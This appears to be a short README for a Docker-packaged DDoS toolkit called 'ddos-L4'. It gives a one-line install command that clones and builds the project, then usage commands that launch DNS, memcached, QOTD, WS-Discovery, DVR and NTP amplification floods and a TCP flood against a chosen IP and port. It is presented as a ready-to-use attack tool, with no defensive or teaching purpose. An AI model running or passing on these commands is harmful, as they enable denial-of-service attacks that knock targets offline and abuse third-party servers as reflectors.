### 安装 （docker）
apt update -y && apt install docker.io -y && git clone https://github.com/qq1521575701/ddos-L4.git && cd ddos-L4 && docker build -t ddos-L4 . && docker run -itd --name ddos-L4 --network host ddos-L4:latest && docker exec -it ddos /bin/bash

### 使用
docker exec -it ddos-L4 ./dns ip port dns.txt 1 -1 60 &

docker exec -it ddos-L4 ./meme ip port meme.txt 1 -1 60 &

docker exec -it ddos-L4 ./qotd ip port qotd.txt 1 -1 60 &

docker exec -it ddos-L4 ./wsd ip port wsd.txt 1 -1 60 &

docker exec -it ddos-L4 ./dvr ip port dvr.txt 1 -1 60 &

docker exec -it ddos-L4 ./ntp ip port ntp.txt 1 -1 60 &

docker exec -it ddos-L4 ./tcp ip port 1 -1 60 &
